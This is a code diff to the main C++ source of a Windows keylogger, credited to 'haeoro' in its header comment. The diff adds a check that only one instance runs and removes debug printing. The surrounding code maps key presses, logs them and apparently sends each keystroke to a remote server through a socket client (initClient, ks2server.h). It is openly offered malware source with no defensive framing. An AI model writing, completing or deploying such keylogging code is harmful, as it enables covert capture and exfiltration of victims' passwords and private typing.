@@ -1,12 +1,16 @@
 /*
 *    ``~ Main file for the keylogger program (Written by haeoro) ~``
 *
-*    WinMain() initializes all mappings, checks if any key on the keyboard is being pressed.
-*    once a key's value has been found and written to a file, key = 0 tells the program that the key has been found
-*    and logged, and that it should continue checking other keys to see if they're being pressed. 
+*    isProcRunning() Retrieves all of the active PIDs running on the system, then passes it to retrieveProcessName() to
+*    ensure the keylogger program is not running already. The reasoning for this is to prevent multiple instances of 
+*    keylogger running as this can provide data integrity faults.
 *
 *    writeKeyStroke() takes an int key argument, then converts that integer to it's corresponding ascii value using 
 *    static_cast conversion method, then closes the file.
+*         
+*    main() Calls isProcessRunning() to see if the program is running, initializes all mappings, and checks if any key on 
+*    the keyboard is being pressed. once a key's value has been found and written to a file, key = 0 tells the program that the key has been found
+*    and logged, and that it should continue checking other keys to see if they're being pressed.     
 */
 
 #include "core/mappings.h"
@@ -14,10 +18,8 @@
 #include "core/find_shift_keys.h"
 #include "networking/ks2server.h"
 
-#include <windows.h>
 #include <iostream>
 #include <fstream>
-#include <thread>
 #include <winsock2.h>
 #include <psapi.h>
 
@@ -25,47 +27,38 @@ int retrieveProcessName(DWORD procID, char mainProcName[])
 {
     static short int keyloggerInstanceCounter = 0;
     char procName[MAX_PATH];
-    HMODULE hMod;
+    HMODULE hMod = 0;
     HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
     if (procHandle) 
     {
         GetModuleBaseNameA(procHandle, hMod, procName, sizeof(procName)/sizeof(char));
     } 
-    std::cout << procName << " " << mainProcName << "\n";
+    CloseHandle(procHandle);
     if (strcmp(mainProcName, procName) == 0)  
     {
         keyloggerInstanceCounter++;
-        std::cout << "COUNT: " <<  keyloggerInstanceCounter << '\n';
         if (keyloggerInstanceCounter >= 2) 
         {
             return 1;
         }
     }
-    //std::cout << procName << " " << mainProcName << '\n';
-    CloseHandle(procHandle);
     return 0;
 }
 
 int isProcRunning() 
 {
-    DWORD procIDs[1024];
     char mainProcName[MAX_PATH];
-    char test[MAX_PATH] = "hello"; 
-    HMODULE hmModule;
-    DWORD cbNeeded;
+    DWORD procIDs[1024] = {0};
+    HMODULE hmModule = 0;
+    DWORD cbNeeded = 0;
     DWORD mainProcId = GetCurrentProcessId();
     HANDLE mainProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, mainProcId);
-    //std::cout << GetLastError();
     if (mainProcHandle) 
     {
-        GetModuleBaseNameA(mainProcHandle, hmModule, mainProcName, sizeof(mainProcName)/sizeof(char));
-        std::cout << GetLastError();
-        
+        GetModuleBaseNameA(mainProcHandle, hmModule, mainProcName, sizeof(mainProcName)/sizeof(char));        
     }
     CloseHandle(mainProcHandle);
     EnumProcesses(procIDs, sizeof(procIDs), &cbNeeded);
-    //std::cout << mainProcName;
-    //return 1;
     for (int i = 1; procIDs[i] != 0; i++) 
     {
         if (retrieveProcessName(procIDs[i], mainProcName)) 
@@ -99,7 +92,6 @@ void writeKeyStroke(int trueKey, SOCKET sObjC)
 int main()
 {
     if (isProcRunning()) { return 1; }
-    //return 1;
     Maps vkMaps;
     SOCKET sObjClient = initClient();
     vkMaps.initializeMaps();
